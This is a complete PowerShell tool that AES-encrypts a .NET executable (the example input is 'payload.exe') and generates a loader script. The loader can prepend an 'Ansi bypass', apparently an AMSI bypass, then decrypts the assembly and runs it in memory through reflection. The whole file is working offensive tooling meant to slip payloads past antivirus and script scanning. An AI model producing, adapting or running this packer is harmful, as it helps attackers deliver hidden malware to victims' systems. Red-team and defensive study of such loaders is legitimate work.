<#
.SYNOPSIS
    Encrypts a .NET binary using AES encryption.
.DESCRIPTION
    Encrypts a .NET binary using AES encryption.
.PARAMETER BinaryPath
    The path to the binary to encrypt.
.PARAMETER AnsiPath
    The path to the Ansi bypass.
.PARAMETER Invoke
    Invoke the encrypted binary.
.PARAMETER Arugments
    The arguments to pass to the binary.
.PARAMETER OutputFile
    The path to the output file.
.EXAMPLE
    .\Invoke-DotNetAESEncryptor.ps1 -BinaryPath "C:\Temp\payload.exe" -AnsiPath "C:\Temp\ansi.ps1" -Invoke -Arguments "arg1 arg2"
#>

#--------[Declarations]--------#
[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true)]
    [String]$BinaryPath,
    [Parameter(Mandatory=$false)]
    [String]$AnsiPath,
    [Parameter(Mandatory=$false)]
    [Switch]$Invoke,
    [Parameter(Mandatory=$false)]
    [String]$Arguments,
    [Parameter(Mandatory=$false)]
    [String]$OutputFile
)

#--------[Execution]--------#
# Test if the binary exists
if (-not (Test-Path -Path $BinaryPath)) {
    Write-Error "[!] The binary '$BinaryPath' does not exist."
    return
} else {
    $BinaryPath = Resolve-Path -Path $BinaryPath
}

# if output file is not specified, use the same name as the input file
if (-not $OutputFile) {
    $OutputFile = $BinaryPath
    $OutputFile = Split-Path -Path $OutputFile -Leaf
    $OutputFile += ".ps1"
    # Test if the output file exists
    if (Test-Path -Path $OutputFile) {
        Write-Error "[!] The output file '$OutputFile' already exists."
        # ask user does he want to overwrite
        $choice = Read-Host "Do you want to overwrite it? (Y/N)"
        if ($choice -eq "N") {
            return
        }
    }
} else {
    # Test if the output file exists
    if (Test-Path -Path $OutputFile) {
        Write-Error "[!] The output file '$OutputFile' already exists."
        $choice = Read-Host "Do you want to overwrite it? (Y/N)"
        if ($choice -eq "N") {
            return
        }
    }
}

# Test if the Ansi bypass exists
if ($AnsiPath) {
    if (-not (Test-Path -Path $AnsiPath)) {
        Write-Error "[!] The Ansi bypass '$AnsiPath' does not exist."
        return
    } else {
        $AnsiPath = Resolve-Path -Path $AnsiPath
    }
}

# Read the binary bytes
$BinaryBytes = [System.IO.File]::ReadAllBytes($BinaryPath)

# Generate a random key and IV
$Key = New-Object Byte[] 32
$IV = New-Object Byte[] 16
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($Key)
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($IV)

# Encrypt the binary
$AES = New-Object Security.Cryptography.AesManaged
$AES.Key = $Key
$AES.IV = $IV
$AES.Mode = [Security.Cryptography.CipherMode]::CBC
$AES.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$Encryptor = $AES.CreateEncryptor($AES.Key, $AES.IV)

# Encrypt the binary bytes and convert them to a base64 string
$EncryptedBinary = $Encryptor.TransformFinalBlock($BinaryBytes, 0, $BinaryBytes.Length)
$EncryptedBinary = [Convert]::ToBase64String($EncryptedBinary)

# If the Ansi bypass is specified, read the Ansi bypass bytes
if ($AnsiPath) {
    $AnsiText = [System.IO.File]::ReadAllText($AnsiPath)
} else {
    $AnsiText = ""
}

# If the Invoke switch is specified, add the Invoke code
if ($Invoke) {
    if ($null -eq $Arguments -or $Arguments -eq "") {
        $Arguments = ""
    } else {
        $Arguments = "-Arguments '$Arguments'"
    }
    $InvokeCode = "Invoke-AESDotNet $Arguments"
} else {
    $InvokeCode = ""
}

# Generate the decryption code
$DecryptionScript = @"
$AnsiText

function Invoke-AESDotNet {
    param(
        [Parameter(Position = 0)]
        [string]`$Arguments
    )
    `$Key = New-Object Byte[] 32
    `$IV = New-Object Byte[] 16
    `$Key = [System.Convert]::FromBase64String("$([System.Convert]::ToBase64String($Key))")
    `$IV = [System.Convert]::FromBase64String("$([System.Convert]::ToBase64String($IV))")

    # Decrypting the binary
    `$EncryptedBytes = [System.Convert]::FromBase64String("$EncryptedBinary")

    `$AesManaged = New-Object Security.Cryptography.AesManaged
    `$AesManaged.Key = `$Key
    `$AesManaged.IV = `$IV
    `$AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    `$AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    `$Decryptor = `$AesManaged.CreateDecryptor(`$AesManaged.Key, `$AesManaged.IV)

    `$DecryptedBytes = `$Decryptor.TransformFinalBlock(`$EncryptedBytes, 0, `$EncryptedBytes.Length)

    `$Assembly = [System.Reflection.Assembly]::Load(`$DecryptedBytes)

    `$Method = `$Assembly.EntryPoint

    `$Parameters = @()
    if (`$Method.GetParameters().Length -eq 1) {
        if (`$Arguments -eq "") {
            `$Parameters = New-Object string[] 1
        } else {
            `$Parameters = New-Object string[][] 1
            `$ArgumentsArray = `$Arguments.Split(" ")
            `$Parameters[0] = New-Object string[] `$ArgumentsArray.Count
            for (`$i = 0; `$i -lt `$ArgumentsArray.Count; `$i++) {
                `$Parameters[0][`$i] = `$ArgumentsArray[`$i]
            }
        }
    }

    `$Method.Invoke(`$null, `$Parameters)
}

$InvokeCode
"@

# Write the decryption script to the output file
$DecryptionScript | Out-File -FilePath $OutputFile

# Test if the output file exists
if (Test-Path -Path $OutputFile) {
    Write-Host "[+] The output file '$OutputFile' was created successfully."
} else {
    Write-Error "[!] The output file '$OutputFile' was not created."
}

# Write debug information
Write-Host "`n[i] Binary path: $BinaryPath"
Write-Host "[i] Ansi path: $AnsiPath"
Write-Host "[i] Key: $([System.Convert]::ToBase64String($Key))"
Write-Host "[i] IV: $([System.Convert]::ToBase64String($IV))"

Write-Host "`n[*] SHA256 of the original binary: $(Get-FileHash -Path $BinaryPath -Algorithm SHA256)"
Write-Host "[*] SHA256 of the encrypted script: $(Get-FileHash -Path $OutputFile -Algorithm SHA256)`n"